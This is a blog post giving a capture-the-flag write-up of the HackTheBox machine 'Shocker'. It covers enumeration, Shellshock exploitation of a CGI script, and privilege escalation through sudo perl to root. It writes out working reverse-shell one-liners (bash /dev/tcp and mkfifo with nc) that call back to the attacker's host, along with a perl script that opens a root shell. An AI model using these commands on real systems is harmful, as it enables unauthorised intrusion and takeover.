---
layout: post
title: "HackTheBox - Hacking Shocker"
date: 2018-02-21 19:00:00
tags: hackthebox ctf 
description: Shocker was my second machine on HackTheBox. Finding the way into it was really painful. Even that it was an easy machine, it took me a few hours to collect all the points. Have fun reading about my journey.
---

### **Disclaimer:** 
As by the ToS of HackTheBox, solutions cannot be posted before the machine is retired, so you won't be able to use this post as your way into the described machine, since it'll already be out-of-service.

# Let's begin
Shocker was my second machine, also an easy one (by the ratings), but it was tough to get it. Once I was there, it was straighforward getting the flags. It's IP was 10.10.10.56. 

## Enumerating
> On my machine
{:.filename}
{% highlight text %}
{% raw %}
# Nmap 7.60 scan initiated Sun Feb  4 12:12:55 2018 as: nmap -A -O -sC -sS -T4 -o nmap-shocker.txt 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (EdDSA)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=2/4%OT=80%CT=1%CU=37687%PV=Y%DS=2%DC=T%G=Y%TM=5A771517
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11
OS:NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 25/tcp)
HOP RTT       ADDRESS
1   273.99 ms 10.10.14.1
2   272.89 ms 10.10.10.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  4 12:13:43 2018 -- 1 IP address (1 host up) scanned in 48.31 seconds
{% endraw %}
{% endhighlight %}

The machine has HTTP and SSH running. No users, no SSH for the moment. I checked HTTP.

### HTTP server
Accessing http://10.10.10.56 returned the following page. 

![img]({{ '/assets/images/shocker/http.png' | relative_url}}){: .center-image}*Page on http://10.10.10.56*

It meant nothing and the page source code wasn't interesting. Nevertheless, I still think that the entry point is via web, so I started DirBuster and kept trying to find something.

![img]({{ '/assets/images/shocker/dirbuster1.png' | relative_url}}){: .center-image}*DirBuster parameters*

![img]({{ '/assets/images/shocker/dirbuster2.png' | relative_url}}){: .center-image}*DirBuster results*

**Note 1**: Later I noticed that using `DirBuster` without changing the default parameters was a mistake.

After some time `DirBuster` finished running without results. I went back and changed the **wordlist** used. I selected one that was way larger and the **Time to Finish** was a few hours. I left it running without hopes and gave up to not checking out the forum. I saw a few answers saying to **think what I was looking for**. Of course I didn't know at the time, so I kept reading. Some answers started pointing to some dir in the form `xxx-bin`. 
Ok, I should look for something on `cgi-bin`, but what? I knew that `cgi-bin` contents used to be **perl scripts**. I took note and kept reading. Some comments refered to the name of the machine and one asked something like: 
> -Should I keep searching for a working shellshock exploit? 
> -Yes

Now I know that I should search inside `cgi-bin` and the machine has something to do with `shellshock`. Let's return to `DirBuster`.
For the sake of conservativeness, I set `sh,pl` on the *File extension* field. 

![img]({{ '/assets/images/shocker/dirbuster3.png' | relative_url}}){: .center-image}*DirBuster parameters used on the successful run*

![img]({{ '/assets/images/shocker/dirbuster4.png' | relative_url}}){: .center-image}*DirBuster successful results*

**Note 2**: Between the first and successful DirBuster runs, it took about 2 hours.

I was sure that it was the entry point. I `curl`'ed `10.10.10.56/cgi-bin/user.sh` and saw this:

> On my machine
{:.filename}
{% highlight text %}
{% raw %}
root@kali:~/ctf/shocker# curl http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 09:45:45 up  1:33,  0 users,  load average: 0.80, 0.59, 0.49
{% endraw %}
{% endhighlight %}

Let's find a `shellshock` exploit. I asked the internet and it returned [this](https://github.com/pwnGuy/shellshock-shell/) particular page.

So I downloaded it and ran:
> On my machine
{:.filename}
{% highlight text %}
{% raw %}
root@kali:~/ctf/shocker# ./shellshock.py -u http://10.10.10.56/cgi-bin/user.sh
> id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
> pwd
/usr/lib/cgi-bin
> 
{% endraw %}
{% endhighlight %}

Finally! 

## Getting a decent shell
Before going for the flags, I wanted a better shell. And so I got one.

> On my machine
{:.filename}
{% highlight text %}
{% raw %}
root@kali:~/ctf/shocker# nc -nlvp 1234
listening on [any] 1234 ...
{% endraw %}
{% endhighlight %}

> On the server
{:.filename}
{% highlight text %}
{% raw %}
> bash -i >& /dev/tcp/10.10.15.101/1234 0>&1
{% endraw %}
{% endhighlight %}

Then I got a shell!

{% highlight text %}
{% raw %}
root@kali:~/ctf/shocker# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 48700
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
{% endraw %}
{% endhighlight %}

But ..... this shell was echoing every key typed. I needed a better shell. 

> On my machine
{:.filename}
{% highlight text %}
{% raw %}
root@kali:~/ctf/shocker# nc -nlvp 1235
listening on [any] 1235 ...
{% endraw %}
{% endhighlight %}

> On the server
{:.filename}
{% highlight text %}
{% raw %}
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LISTENING-IP LISTENING-PORT > /tmp/f
{% endraw %}
{% endhighlight %}

> On my machine
{:.filename}
{% highlight text %}
{% raw %}
root@kali:~/ctf/shocker# nc -nlvp 1235
listening on [any] 1235 ...
connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 35756
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
{% endraw %}
{% endhighlight %}

Now the shell was decent. Flags, here I come!

## Getting the `user` flag (it was boring)
To score the first points, I had to find the `user.txt` file, where the flag was. I took the direct approach:
{% highlight text %}
{% raw %}
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
2ec24e11320026d1e70ff3e16695b233
{% endraw %}
{% endhighlight %}
That was very easy. Let's step up the game.

## Getting the `root` flag (it was cool)
As my first try, ran the obvious `sudo su` but it didn't work because the user's password was unknown. 

### LinEnum
So, there is this awesome enumeration script called `LinEnum.sh` (that can be found [here](https://github.com/rebootuser/LinEnum)). Since the box couldn't communicate with the outer-world, I had to upload it from my machine and I chose `nc` to do that.

> On my machine
{:.filename}
{% highlight text %}
{% raw %}
root@kali:~/ctf/shocker# nc -nlvp 1233 < LinEnum.sh 
listening on [any] 1233 ...
{% endraw %}
{% endhighlight %}

> On the server
{:.filename}
{% highlight text %}
{% raw %}
shelly@Shocker:/usr/lib/cgi-bin$ cd /tmp
shelly@Shocker:/tmp$ nc 10.10.15.101 1233 > enum.sh
shelly@Shocker:/tmp$ sh enum.sh -t -r shocker
{% endraw %}
{% endhighlight %}

The produced report was named `shocker-04-02-18` and I downloaded it via `nc` (that I'll suppress).
Upon reading it, I saw that `/bin/perl` could be ran as `root`. At this point, I noticed that I was very close. I could just write a script to print the `root` flag but that would be pretty boring, right? I'd rather get a `root` shell just for fun! And so I came up with this simple script:

> root.pl
{:.filename}
{% highlight text %}
{% raw %}
#!/bin/perl
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.101 1233 >/tmp/f");
{% endraw %}
{% endhighlight %}

And proceeded to get the desired shell:
> On my machine
{:.filename}
{% highlight text %}
{% raw %}
root@kali:~/ctf/shocker# nc -nlvp 1233
listening on [any] 1233 ...
{% endraw %}
{% endhighlight %}

> On the server
{:.filename}
{% highlight text %}
{% raw %}
shelly@Shocker:/tmp$ sudo /usr/bin/perl root.pl
{% endraw %}
{% endhighlight %}

And finally I was (g)`root`!
{% highlight text %}
{% raw %}
root@kali:~/ctf/shocker# nc -nlvp 1233
listening on [any] 1233 ...
connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 40344
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
{% endraw %}
{% endhighlight %}

Alright, the `root` flag ...
{% highlight text %}
{% raw %}
# cat /root/root.txt
52c2715605d70c7619030560dc1ca467
{% endraw %}
{% endhighlight %}

# Wrapping up
It was hard for me to find the entry point, but after that, it was pretty simple. I noticed that sometimes I overcomplicate stuff e.g. I think I could have just set up a perl script with `system("bash")` and get `root` in the fraction of the time, but I only thought about that hours after. I feel that I lack some enumeration skills and mindset, but that is the purpose of me working on these boxes. 

exit(0);
